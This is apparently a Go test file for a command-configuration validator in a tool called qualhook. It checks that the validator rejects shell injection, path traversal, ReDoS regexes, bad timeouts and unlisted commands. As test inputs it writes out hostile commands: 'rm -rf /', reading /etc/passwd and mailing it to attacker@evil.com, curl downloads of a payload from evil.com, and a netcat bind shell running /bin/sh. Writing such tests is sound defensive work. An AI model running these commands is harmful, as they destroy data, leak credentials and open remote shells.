package config

import (
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/bebsworthy/qualhook/pkg/config"
)

// TestValidateCommand_SecurityChecks tests security validation for commands
func TestValidateCommand_SecurityChecks(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name    string
		cmd     *config.CommandConfig
		wantErr bool
		errMsg  string
	}{
		{
			name: "command with shell injection",
			cmd: &config.CommandConfig{
				Command: "npm; rm -rf /",
				Args:    []string{},
			},
			wantErr: true,
			errMsg:  "potential shell injection",
		},
		{
			name: "args with command substitution",
			cmd: &config.CommandConfig{
				Command: "echo",
				Args:    []string{"$(cat /etc/passwd)"},
			},
			wantErr: true,
			errMsg:  "potential shell injection",
		},
		{
			name: "valid command",
			cmd: &config.CommandConfig{
				Command: "npm",
				Args:    []string{"run", "test"},
			},
			wantErr: false,
		},
		{
			name: "command with pipe",
			cmd: &config.CommandConfig{
				Command: "cat",
				Args:    []string{"file.txt", "|", "grep", "password"},
			},
			wantErr: true,
			errMsg:  "potential shell injection",
		},
		{
			name: "dangerous rm command",
			cmd: &config.CommandConfig{
				Command: "rm",
				Args:    []string{"-rf", "/"},
			},
			wantErr: true,
			errMsg:  "dangerous rm command",
		},
		{
			name: "curl with malicious output",
			cmd: &config.CommandConfig{
				Command: "curl",
				Args:    []string{"-o", "/etc/passwd", "http://evil.com"},
			},
			wantErr: true,
			errMsg:  "dangerous output path",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateCommand(tt.cmd)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidateCommand() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

// TestValidate_MaliciousRegexPatterns tests validation of potentially malicious regex patterns
func TestValidate_MaliciousRegexPatterns(t *testing.T) {
	v := NewValidator()
	v.CheckCommands = false // Don't check command existence

	tests := []struct {
		name    string
		pattern *config.RegexPattern
		wantErr bool
		errMsg  string
	}{
		{
			name: "ReDoS vulnerable pattern - nested quantifiers",
			pattern: &config.RegexPattern{
				Pattern: "(a*)*",
			},
			wantErr: true,
			errMsg:  "catastrophic backtracking",
		},
		{
			name: "ReDoS vulnerable pattern - alternation",
			pattern: &config.RegexPattern{
				Pattern: "(a|a)*",
			},
			wantErr: true,
			errMsg:  "catastrophic backtracking",
		},
		{
			name: "safe pattern",
			pattern: &config.RegexPattern{
				Pattern: "error:\\s+(.+)",
			},
			wantErr: false,
		},
		{
			name: "pattern too long",
			pattern: &config.RegexPattern{
				Pattern: strings.Repeat("a", 501),
			},
			wantErr: true,
			errMsg:  "too long",
		},
		{
			name: "too many capturing groups",
			pattern: &config.RegexPattern{
				Pattern: "(a)(b)(c)(d)(e)(f)(g)(h)(i)(j)(k)(l)",
			},
			wantErr: true,
			errMsg:  "too many capturing groups",
		},
		{
			name: "invalid regex syntax",
			pattern: &config.RegexPattern{
				Pattern: "[abc",
			},
			wantErr: true,
			errMsg:  "invalid regex",
		},
	}

	cfg := &config.Config{
		Version: "1.0",
		Commands: map[string]*config.CommandConfig{
			"test": {
				Command: "echo",
				Args:    []string{"test"},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Add pattern to config
			cfg.Commands["test"].ErrorDetection = &config.ErrorDetection{
				Patterns: []*config.RegexPattern{tt.pattern},
			}

			err := v.Validate(cfg)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("Validate() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

// TestValidate_PathTraversalInPatterns tests path traversal prevention in path patterns
func TestValidate_PathTraversalInPatterns(t *testing.T) {
	v := NewValidator()
	v.CheckCommands = false

	tests := []struct {
		name    string
		path    string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid relative path pattern",
			path:    "src/**/*.go",
			wantErr: false,
		},
		{
			name:    "path with directory traversal",
			path:    "../../../etc/**",
			wantErr: true,
			errMsg:  "directory traversal",
		},
		{
			name:    "absolute path pattern",
			path:    "/etc/passwd",
			wantErr: true,
			errMsg:  "absolute paths are not allowed",
		},
		{
			name:    "windows absolute path",
			path:    "C:\\Windows\\System32\\*",
			wantErr: true,
			errMsg:  "absolute paths are not allowed",
		},
		{
			name:    "path with null byte",
			path:    "test\x00/etc",
			wantErr: true,
			errMsg:  "null byte",
		},
		{
			name:    "empty path pattern",
			path:    "",
			wantErr: true,
			errMsg:  "path is required", // This is the actual error from config validation
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &config.Config{
				Version: "1.0",
				Commands: map[string]*config.CommandConfig{
					"test": {
						Command: "echo",
						Args:    []string{"test"},
					},
				},
				Paths: []*config.PathConfig{
					{
						Path: tt.path,
						Commands: map[string]*config.CommandConfig{
							"test": {
								Command: "echo",
								Args:    []string{"test"},
							},
						},
					},
				},
			}

			err := v.Validate(cfg)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("Validate() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

// TestValidate_TimeoutLimits tests validation of timeout values
func TestValidate_TimeoutLimits(t *testing.T) {
	v := NewValidator()
	v.CheckCommands = false

	tests := []struct {
		name    string
		timeout int
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid timeout",
			timeout: 30000, // 30 seconds
			wantErr: false,
		},
		{
			name:    "timeout too large",
			timeout: 7200000, // 2 hours
			wantErr: true,
			errMsg:  "exceeds maximum",
		},
		{
			name:    "negative timeout",
			timeout: -1000,
			wantErr: true,
			errMsg:  "negative",
		},
		{
			name:    "timeout too short",
			timeout: 50, // 50ms
			wantErr: true,
			errMsg:  "too short",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &config.Config{
				Version: "1.0",
				Commands: map[string]*config.CommandConfig{
					"test": {
						Command: "echo",
						Args:    []string{"test"},
						Timeout: tt.timeout,
					},
				},
			}

			err := v.Validate(cfg)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("Validate() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

// TestValidate_CommandWhitelist tests command whitelisting functionality
func TestValidate_CommandWhitelist(t *testing.T) {
	v := NewValidator()
	v.CheckCommands = false
	v.AllowedCommands = []string{"npm", "go", "echo"}

	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{
			name:    "allowed command",
			command: "npm",
			wantErr: false,
		},
		{
			name:    "disallowed command",
			command: "curl",
			wantErr: true,
		},
		{
			name:    "allowed command with path",
			command: "/usr/bin/echo",
			wantErr: false, // Should match by basename
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &config.Config{
				Version: "1.0",
				Commands: map[string]*config.CommandConfig{
					"test": {
						Command: tt.command,
						Args:    []string{"test"},
					},
				},
			}

			err := v.Validate(cfg)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.wantErr && !strings.Contains(err.Error(), "not in allowed list") {
				t.Errorf("Validate() error = %v, expected whitelist error", err)
			}
		})
	}
}

// TestValidate_ComplexMaliciousConfig tests a complex configuration with multiple security issues
func TestValidate_ComplexMaliciousConfig(t *testing.T) {
	v := NewValidator()
	v.CheckCommands = false

	cfg := &config.Config{
		Version: "1.0",
		Commands: map[string]*config.CommandConfig{
			"format": {
				Command: "prettier",
				Args:    []string{"--write", "**/*.js"},
			},
			"exploit1": {
				Command: "sh",
				Args:    []string{"-c", "cat /etc/passwd | mail attacker@evil.com"},
			},
			"exploit2": {
				Command: "curl",
				Args:    []string{"-o", "/usr/bin/malware", "http://evil.com/payload"},
			},
		},
		Paths: []*config.PathConfig{
			{
				Path: "../../../",
				Commands: map[string]*config.CommandConfig{
					"backdoor": {
						Command: "nc",
						Args:    []string{"-l", "-p", "4444", "-e", "/bin/sh"},
					},
				},
			},
		},
	}

	err := v.Validate(cfg)
	if err == nil {
		t.Fatal("expected validation to fail for malicious config")
	}

	// Should catch at least one security issue
	securityErrors := []string{
		"shell injection",
		"dangerous",
		"directory traversal",
		"forbidden",
	}

	found := false
	for _, errMsg := range securityErrors {
		if strings.Contains(err.Error(), errMsg) {
			found = true
			break
		}
	}

	if !found {
		t.Errorf("expected security-related error, got: %v", err)
	}
}

// TestValidate_ResourceExhaustion tests protection against resource exhaustion attacks
func TestValidate_ResourceExhaustion(t *testing.T) {
	v := NewValidator()
	v.CheckCommands = false

	tests := []struct {
		name    string
		cfg     *config.Config
		wantErr bool
		errMsg  string
	}{
		{
			name: "excessive output filter patterns",
			cfg: &config.Config{
				Version: "1.0",
				Commands: map[string]*config.CommandConfig{
					"test": {
						Command: "echo",
						OutputFilter: &config.FilterConfig{
							ErrorPatterns: make([]*config.RegexPattern, 0),
							MaxOutput:     100,
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "pattern designed to consume CPU",
			cfg: &config.Config{
				Version: "1.0",
				Commands: map[string]*config.CommandConfig{
					"test": {
						Command: "echo",
						ErrorDetection: &config.ErrorDetection{
							Patterns: []*config.RegexPattern{
								{Pattern: "(a+)+b"}, // ReDoS pattern
							},
						},
					},
				},
			},
			wantErr: true,
			errMsg:  "catastrophic backtracking",
		},
	}

	// Add many patterns to first test case to simulate resource exhaustion attempt
	for i := 0; i < 50; i++ {
		tests[0].cfg.Commands["test"].OutputFilter.ErrorPatterns = append(
			tests[0].cfg.Commands["test"].OutputFilter.ErrorPatterns,
			&config.RegexPattern{Pattern: fmt.Sprintf("error%d", i)},
		)
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.Validate(tt.cfg)
			if (err != nil) != tt.wantErr {
				t.Errorf("Validate() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("Validate() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

// TestSuggestFixes_SecurityErrors tests that security-related errors get appropriate fix suggestions
func TestSuggestFixes_SecurityErrors(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name        string
		errMsg      string
		wantSuggest []string
	}{
		{
			name:   "regex pattern error",
			errMsg: "invalid regex pattern: missing closing bracket",
			wantSuggest: []string{
				"Check your regex pattern syntax",
				"Test your pattern at https://regex101.com/",
				"Escape special characters",
			},
		},
		{
			name:   "timeout error",
			errMsg: "timeout 50ms is too short",
			wantSuggest: []string{
				"Use a timeout between 100ms and 3600000ms",
				"Consider if your command really needs",
			},
		},
		{
			name:   "path pattern error",
			errMsg: "invalid path pattern: contains ..",
			wantSuggest: []string{
				"Use relative paths only",
				"Use ** for recursive matching",
				"Avoid using .. in path patterns",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			suggestions := v.SuggestFixes(errors.New(tt.errMsg))
			
			for _, want := range tt.wantSuggest {
				found := false
				for _, got := range suggestions {
					if strings.Contains(got, want) {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected suggestion containing %q not found in %v", want, suggestions)
				}
			}
		})
	}
}